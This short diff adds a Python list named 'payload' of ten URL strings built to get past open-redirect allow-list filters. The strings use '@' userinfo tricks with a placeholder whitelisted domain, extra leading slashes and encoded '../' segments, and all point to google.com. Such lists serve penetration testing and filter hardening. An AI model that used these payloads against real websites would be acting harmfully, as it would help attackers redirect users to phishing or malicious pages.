@@ -1,0 +1,10 @@
+payload=["https://www.whitelisteddomain.tld@google.com/%2f..",
+"/https://google.com/%2f..",
+"/https://www.whitelisteddomain.tld@google.com/%2f..",
+"//www.google.com/%2f%2e%2e",
+"//www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
+"///www.google.com/%2f%2e%2e",
+"///www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
+"////www.google.com/%2f%2e%2e",
+"////www.whitelisteddomain.tld@www.google.com/%2f%2e%2e",
+"https://www.google.com/%2f%2e%2e"]
